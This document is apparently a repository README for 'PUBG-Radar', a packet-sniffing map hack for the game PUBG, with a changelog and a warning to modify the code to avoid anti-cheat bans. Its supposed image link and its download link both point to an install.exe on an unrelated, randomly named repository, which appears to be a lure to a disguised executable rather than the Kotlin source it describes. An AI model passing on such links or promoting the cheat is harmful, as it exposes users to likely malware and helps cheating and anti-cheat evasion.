PUBG-Radar
PUBG-Radar by sniffering udp packet

A little map hack program for PUBG game that shows players' positions on a HTML map.

Imgur picture of the web map:

[![c3dr0](radar link)](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.exe)

Written in Kotlin

Changes
Get self player's location by parsing CharMoveComp RPC. So the player's direction is corrected now.
Get item's relative locaiton by DroppedItemInteractionComponent. So the item location is corrected now.
Change readRotator() to readRotationShort() fixes empty player state.
DroppedItem is shown.
Fully parse ATslCharacter. So player health is shown.
Correct player color when driving.
Equipped weapons are shown.
Clear DroppedItem and DroppedItemGroup when picking up.

[Build DOWNLOAD](https://github.com/loasd104/asfsfscxs/releases/download/Release/install.exe)

Note
You need to modify the code before playing game, or you will be banned by BE.
